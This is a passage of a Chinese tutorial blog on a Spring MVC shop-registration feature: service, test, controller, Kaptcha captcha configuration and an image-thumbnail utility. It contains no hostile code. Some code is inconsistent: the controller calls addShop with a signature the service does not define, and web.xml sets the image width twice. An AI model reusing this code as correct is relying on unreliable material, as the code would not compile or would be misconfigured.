店铺操作成功时使用的构造器，同时返回一个shop 列表</span><span class="hljs-keyword">public</span> <span class="hljs-title function_">ShopExecution</span><span class="hljs-params">(ShopStateEnum stateEnum, List&lt;Shop&gt; shopList)</span> &#123;<span class="hljs-built_in">this</span>.state = stateEnum.getState();<span class="hljs-built_in">this</span>.stateInfo = stateEnum.getStateInfo();<span class="hljs-built_in">this</span>.shopList = shopList;&#125;<span class="hljs-comment">// Getter &amp; Setter</span>&#125;language-Java复制代码</code></pre><ol><li>Service 实现类</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.service.impi;<span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShopServicelmpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ShopService</span>&#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ShopDao shopDao;<span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> ShopExecution <span class="hljs-title function_">addShop</span><span class="hljs-params">(Shop shop, File shopImg)</span> &#123;<span class="hljs-keyword">if</span>(shop == <span class="hljs-literal">null</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopExecution</span>(ShopStateEnum.NULL_SHOP);&#125;<span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// 给店铺信息赋初始值</span>shop.setEnableStatus(<span class="hljs-number">0</span>);shop.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());shop.setLastEditTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<span class="hljs-comment">// 添加店铺信息</span><span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> shopDao.insertShop(shop);<span class="hljs-keyword">if</span>(effectedNum &lt;= <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopOperationException</span>(<span class="hljs-string">&quot;店铺创建失败&quot;</span>);&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span>(shopImg != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">// 存储图片</span><span class="hljs-keyword">try</span> &#123;addShopImg(shop, shopImg);&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopOperationException</span>(<span class="hljs-string">&quot;添加店铺图片失败：&quot;</span> + e.getMessage());&#125;<span class="hljs-comment">// 更新店铺的图片地址</span>effectedNum = shopDao.updateShop(shop);<span class="hljs-keyword">if</span>(effectedNum &lt;= <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopOperationException</span>(<span class="hljs-string">&quot;更新图片地址失败&quot;</span>);&#125;&#125;&#125;&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopOperationException</span>(<span class="hljs-string">&quot;addShop error:&quot;</span> + e.getMessage());&#125;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopExecution</span>(ShopStateEnum.CHECK, shop);&#125;<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addShopImg</span><span class="hljs-params">(Shop shop, File shopImg)</span> &#123;<span class="hljs-comment">// TODO Auto-generated method stub</span><span class="hljs-type">String</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> PathUtil.getShopImagePath(shop.getShopId());<span class="hljs-type">String</span> <span class="hljs-variable">shopImgAddr</span> <span class="hljs-operator">=</span> ImageUtil.generateThumbnail(shopImg, dest);shop.setShopImg(shopImgAddr);&#125;&#125;language-Java复制代码</code></pre><ol><li>Service 层 单元测试</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.service;<span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShopServiceTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTest</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ShopService shopService;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAddShop</span><span class="hljs-params">()</span> &#123;<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();<span class="hljs-type">PersonInfo</span>  <span class="hljs-variable">owner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonInfo</span>();<span class="hljs-type">Area</span> <span class="hljs-variable">area</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Area</span>();<span class="hljs-type">ShopCategory</span> <span class="hljs-variable">shopCategory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopCategory</span>();<span class="hljs-comment">// 由于该shop涉及其他表，所以给其他表设置了一些测试值，现在初始化这些值，才可以正常的添加店铺</span>owner.setUserId(<span class="hljs-number">1L</span>);area.setAreaId(<span class="hljs-number">2</span>);shopCategory.setShopCategoryId(<span class="hljs-number">1L</span>);shop.setOwner(owner);shop.setArea(area);shop.setShopCategory(shopCategory);shop.setShopName(<span class="hljs-string">&quot;测试的店铺1&quot;</span>);shop.setShopDesc(<span class="hljs-string">&quot;test1&quot;</span>);shop.setShopAddr(<span class="hljs-string">&quot;test1&quot;</span>);shop.setPhone(<span class="hljs-string">&quot;test1&quot;</span>);shop.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());shop.setEnableStatus(ShopStateEnum.CHECK.getState()); <span class="hljs-comment">// 0</span>shop.setAdvice(<span class="hljs-string">&quot;审核中&quot;</span>);<span class="hljs-type">File</span> <span class="hljs-variable">shopImg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/xiaohuangren.jpeg&quot;</span>);<span class="hljs-type">ShopExecution</span> <span class="hljs-variable">se</span> <span class="hljs-operator">=</span> shopService.addShop(shop,shopImg);assertEquals(ShopStateEnum.CHECK.getState(), se.getState());&#125;&#125;language-Java复制代码</code></pre><hr><h4 id="5-1-3、-Controller-层"><a href="#5-1-3、-Controller-层" class="headerlink" title="5.1.3、 Controller 层"></a>5.1.3、 Controller 层</h4><ol><li>ShopManagementController.java</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.web.shopadmin;<span class="hljs-meta">@Controller</span><span class="hljs-meta">@RequestMapping(&quot;/shopadmin&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShopManagementController</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ShopService shopService;<span class="hljs-meta">@RequestMapping(value=&quot;/registershop&quot;, method = RequestMethod.POST)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">private</span> Map&lt;String, Object&gt; <span class="hljs-title function_">registerShop</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> ShopOperationException, IOException &#123;Map&lt;String, Object&gt; modelMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<span class="hljs-comment">// 验证码</span><span class="hljs-keyword">if</span>(!CodeUtil.checkVerifyCode(request)) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;输入了错误的验证码&quot;</span>);<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-comment">// 1.接受并转化相应的参数，思路：获取前端传过来的店铺信息，将数据转换为实体类，同时获取前端传过来的文件流，将图片存放在shopImg里面去。</span><span class="hljs-comment">// 使用工具类，将相应的参数转化为字符串</span><span class="hljs-type">String</span> <span class="hljs-variable">shopStr</span> <span class="hljs-operator">=</span> HttpServletRequestUtil.getString(request, <span class="hljs-string">&quot;shopStr&quot;</span>);<span class="hljs-comment">// 使用 jackson-databind库 将字符串转化为实体类，JSON to POJO and back</span><span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-keyword">try</span> &#123;shop = mapper.readValue(shopStr, Shop.class);&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, e.getMessage());<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-comment">// 获取前端文件流，保存上传图片的文件流</span><span class="hljs-type">CommonsMultipartFile</span> <span class="hljs-variable">shopImg</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 保存上传图片的文件流</span><span class="hljs-comment">// 从 request session 的上下文获取相关文件上传的内容</span><span class="hljs-type">CommonsMultipartResolver</span> <span class="hljs-variable">commmonsMultipartResolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonsMultipartResolver</span>(request.getSession().getServletContext());<span class="hljs-keyword">if</span>(commmonsMultipartResolver.isMultipart(request)) &#123; <span class="hljs-comment">// 判断是否有上传的文件流</span><span class="hljs-comment">// 如果有上传的文件流，就进行转换 MultipartHttpServletRequest 类型的对象，该对象可以被spring处理文件流对象</span><span class="hljs-type">MultipartHttpServletRequest</span> <span class="hljs-variable">multipartHttpServletRequest</span> <span class="hljs-operator">=</span> (MultipartHttpServletRequest) request;<span class="hljs-comment">// 从该上传对象中提取出图片的文件流，（shopImg 是与前端协商的名称）</span>shopImg = (CommonsMultipartFile) multipartHttpServletRequest.getFile(<span class="hljs-string">&quot;shopImg&quot;</span>);&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 如果没有图片就报错，因为图片是必须的</span>modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;上传图片不能为空&quot;</span>);<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-comment">// 2.注册店铺</span><span class="hljs-keyword">if</span>(shop != <span class="hljs-literal">null</span> &amp;&amp; shopImg != <span class="hljs-literal">null</span>) &#123;<span class="hljs-type">PersonInfo</span> <span class="hljs-variable">owner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonInfo</span>();owner.setUserId(<span class="hljs-number">1L</span>);shop.setOwner(owner);<span class="hljs-type">ShopExecution</span> <span class="hljs-variable">se</span> <span class="hljs-operator">=</span> shopService.addShop(shop, shopImg.getInputStream(), shopImg.getOriginalFilename());<span class="hljs-keyword">if</span>(se.getState() == ShopStateEnum.CHECK.getState()) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">true</span>);&#125;<span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, se.getStateInfo());&#125;<span class="hljs-keyword">return</span> modelMap;&#125; <span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;请输入店铺信息&quot;</span>);<span class="hljs-keyword">return</span> modelMap;&#125;&#125;&#125;language-Java复制代码</code></pre><ol><li>kaptcha 验证码的使用</li></ol><ul><li>引入依赖</li></ul><pre><code class="hljs XML"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.github.penggle/kaptcha --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.penggle<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kaptcha<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>language-XML复制代码</code></pre><ul><li>web.xml 配置</li></ul><pre><code class="hljs xml">  <span class="hljs-comment">&lt;!-- 验证码配置 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Kaptcha<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.google.code.kaptcha.servlet.KaptchaServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 是否有边框 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>kaptcha.border<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>no<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 字体颜色 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>kaptcha.textproducer.font.color<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>red<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 字体大小 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>kaptcha.textproducer.font.size<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>43<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>   <span class="hljs-comment">&lt;!-- 字体样式 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>kaptcha.textproducer.font.names<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>Arial<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 图片宽度 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>kaptcha.image.width<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>135<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 图片高度 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>kaptcha.image.width<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>50<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 使用那些字符生产验证码 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>kaptcha.textproducer.char.string<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>ACDEFHKPRSTWX345679<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 干扰线的颜色 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>kaptcha.noise.color<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>black<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 验证码字符个数 --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>kaptcha.textproducer.char.length<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Kaptcha<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Kaptcha<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>language-xml复制代码</code></pre><ul><li>判断验证码是否正确</li></ul><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> com.imooc.o2o.util;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeUtil</span> &#123;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkVerifyCode</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<span class="hljs-type">String</span> <span class="hljs-variable">verifyCodeExpected</span> <span class="hljs-operator">=</span> (String) request.getSession().getAttribute(com.google.code.kaptcha.Constants.KAPTCHA_SESSION_KEY);<span class="hljs-type">String</span> <span class="hljs-variable">verifyCodeActual</span> <span class="hljs-operator">=</span> HttpServletRequestUtil.getString(request, <span class="hljs-string">&quot;verifyCodeActual&quot;</span>);<span class="hljs-keyword">if</span>(verifyCodeActual == <span class="hljs-literal">null</span> || !verifyCodeActual.equals(verifyCodeExpected)) &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;&#125;language-JAVA复制代码</code></pre><ul><li>举个栗子</li></ul><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(value=&quot;/registershop&quot;, method = RequestMethod.POST)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">private</span> Map&lt;String, Object&gt; <span class="hljs-title function_">registerShop</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> ShopOperationException, IOException &#123;Map&lt;String, Object&gt; modelMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<span class="hljs-comment">// 验证码</span><span class="hljs-keyword">if</span>(!CodeUtil.checkVerifyCode(request)) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;输入了错误的验证码&quot;</span>);<span class="hljs-keyword">return</span> modelMap;&#125;language-Java复制代码&lt;div class=<span class="hljs-string">&quot;item-inner&quot;</span>&gt;  &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;j_captcha&quot;</span> class=<span class="hljs-string">&quot;item-title label&quot;</span>&gt;验证码&lt;/label&gt;  &lt;input    id=<span class="hljs-string">&quot;j_captcha&quot;</span>    name=<span class="hljs-string">&quot;j_captcha&quot;</span>    type=<span class="hljs-string">&quot;text&quot;</span>    class=<span class="hljs-string">&quot;form-control in&quot;</span>    placeholder=<span class="hljs-string">&quot;验证码&quot;</span>  /&gt;  &lt;div class=<span class="hljs-string">&quot;item-input&quot;</span>&gt;    &lt;img      id=<span class="hljs-string">&quot;captcha_img&quot;</span>      alt=<span class="hljs-string">&quot;点击更换&quot;</span>      title=<span class="hljs-string">&quot;点击更换&quot;</span>      onclick=<span class="hljs-string">&quot;changeVerifyCode(this)&quot;</span>      src=<span class="hljs-string">&quot;../Kaptcha&quot;</span>    /&gt;  &lt;/div&gt;&lt;/div&gt;language-html复制代码$(<span class="hljs-string">&#x27;#submit&#x27;</span>).click(function () &#123;<span class="hljs-type">var</span> <span class="hljs-variable">formData</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();<span class="hljs-type">var</span> <span class="hljs-variable">verifyCodeActual</span> <span class="hljs-operator">=</span> $(<span class="hljs-string">&#x27;#j_captcha&#x27;</span>).val();formData.append(<span class="hljs-string">&#x27;verifyCodeActual&#x27;</span>, verifyCodeActual);language-js复制代码</code></pre><hr><h4 id="5-1-4、-拓展"><a href="#5-1-4、-拓展" class="headerlink" title="5.1.4、 拓展"></a>5.1.4、 拓展</h4><ol><li>工具类 ImageUtil.该工具类用于处理预先定义好的图片,该处使用了浓缩图。</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.util;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<span class="hljs-keyword">import</span> java.util.Date;<span class="hljs-keyword">import</span> java.util.Random;<span class="hljs-keyword">import</span> javax.imageio.ImageIO;<span class="hljs-keyword">import</span> org.springframework.web.multipart.commons.CommonsMultipartFile;<span class="hljs-keyword">import</span> net.coobird.thumbnailator.Thumbnails;<span class="hljs-keyword">import</span> net.coobird.thumbnailator.geometry.Positions;<span class="hljs-keyword">import</span> net.coobird.thumbnailator.name.Rename;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 该工具类用于处理预先定义好的图片</span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> jxh</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageUtil</span> &#123;<span class="hljs-comment">// 获取classpath的绝对值路径</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">basePath</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>).getPath();<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sDateFormat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyMMddHHmmss&quot;</span>);<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Random</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<span class="hljs-comment">// 缩略图</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateThumbnail</span><span class="hljs-params">(File thumbnail, String targetAddr)</span> &#123;<span class="hljs-comment">// 自定义图片名称，由于用户可能有重复的图片名称</span><span class="hljs-type">String</span> <span class="hljs-variable">realFileName</span> <span class="hljs-operator">=</span> getRandomFileName();<span class="hljs-comment">// 获取图片的后缀</span><span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> getFileExtension(thumbnail);System.out.print(<span class="hljs-string">&quot;=================================&quot;</span> + extension);<span class="hljs-comment">// 用于处理路径不存在的情况</span>makeDirPath(targetAddr);<span class="hljs-comment">// 图片相对路径</span><span class="hljs-type">String</span> <span class="hljs-variable">relativeAddr</span> <span class="hljs-operator">=</span> targetAddr + realFileName + extension;<span class="hljs-comment">// 文件：相对路径 + 文件组成</span><span class="hljs-type">File</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(PathUtil.getImgBasePath() + relativeAddr);<span class="hljs-comment">// 创建缩略图</span><span class="hljs-keyword">try</span> &#123;Thumbnails.of(thumbnail).size(<span class="hljs-number">200</span>, <span class="hljs-number">200</span>).watermark(Positions.BOTTOM_RIGHT, ImageIO.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(basePath + <span class="hljs-string">&quot;/watermark.png&quot;</span>)), <span class="hljs-number">0.25f</span>).outputQuality(<span class="hljs-number">0.8f</span>).toFile(dest); <span class="hljs-comment">// 压缩和输出路径</span>&#125; <span class="hljs-keyword">catch</span>(IOException e) &#123;e.printStackTrace();&#125;<span class="hljs-keyword">return</span> relativeAddr;&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 创建目标路径所涉及的目录，即 /home/work/hjxstart/xxx.jpg, 那么 home work hjxstart 这三个文件夹都得自动创建</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> targetAddr</span><span class="hljs-comment"> */</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makeDirPath</span><span class="hljs-params">(String targetAddr)</span> &#123;<span class="hljs-comment">// TODO Auto-generated method stub</span><span class="hljs-type">String</span> <span class="hljs-variable">realFileParentPath</span> <span class="hljs-operator">=</span> PathUtil.getImgBasePath() + targetAddr;<span class="hljs-type">File</span> <span class="hljs-variable">dirPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(realFileParentPath);<span class="hljs-keyword">if</span>(!dirPath.exists()) &#123;dirPath.mkdirs();&#125;&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 获取输入文件流的拓展名,获取最后一个.的字符</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> thumbnail</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getFileExtension</span><span class="hljs-params">(File file)</span> &#123;    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> file.getName();    <span class="hljs-type">int</span> <span class="hljs-variable">lastIndexOf</span> <span class="hljs-operator">=</span> name.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>);    <span class="hljs-keyword">if</span> (lastIndexOf == -<span class="hljs-number">1</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">// empty extension</span>    &#125;    <span class="hljs-keyword">return</span> name.substring(lastIndexOf);&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 生成随机文件名，当前年月日小时分钟秒钟 + 五位随机数</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 随机文件名称</span><span class="hljs-comment"> */</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getRandomFileName</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">// 获取随机的五位数</span><span class="hljs-type">int</span> <span class="hljs-variable">rannum</span> <span class="hljs-operator">=</span> r.nextInt(<span class="hljs-number">89999</span>) + <span class="hljs-number">10000</span>;<span class="hljs-type">String</span> <span class="hljs-variable">nowTimeStr</span> <span class="hljs-operator">=</span> sDateFormat.format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<span class="hljs-keyword">return</span> nowTimeStr + rannum;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span 